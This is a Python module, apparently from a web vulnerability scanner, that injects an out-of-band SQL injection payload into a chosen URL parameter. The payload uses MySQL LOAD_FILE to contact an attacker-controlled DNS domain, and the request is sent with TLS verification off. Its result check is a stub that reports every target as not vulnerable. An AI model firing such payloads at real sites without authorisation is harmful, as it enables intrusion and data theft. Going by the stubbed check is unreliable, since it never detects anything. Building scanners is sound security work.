import dns.resolver, dns.query
import requests, uuid
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from backend.config import json as _cfg

OOB_DOMAIN = _cfg["oob_dns_domain"]

def _mutate(url: str, param: str, injection: str) -> str:
    p = urlparse(url)
    qs = parse_qs(p.query)
    qs[param] = injection
    return urlunparse(p._replace(query=urlencode(qs, doseq=True)))

def test(url: str, parameter: str, headers=None, timeout=8.0):
    token = uuid.uuid4().hex
    payload = f"1 UNION SELECT LOAD_FILE('//{token}.{OOB_DOMAIN}/a')-- -"
    target = _mutate(url, parameter, payload)
    try:
        requests.get(target, headers=headers, timeout=timeout, verify=False)
        # Give the DB a moment then query your DNS log system
        # Here we simply flag as unverified; in real infra poll DNS logs
        vulnerable = False
    except Exception:
        vulnerable = False
    return {
        "url": url,
        "technique": "Out‑of‑band",
        "parameter": parameter,
        "payload": payload,
        "vulnerable": vulnerable,
        "severity": "Info",
    }
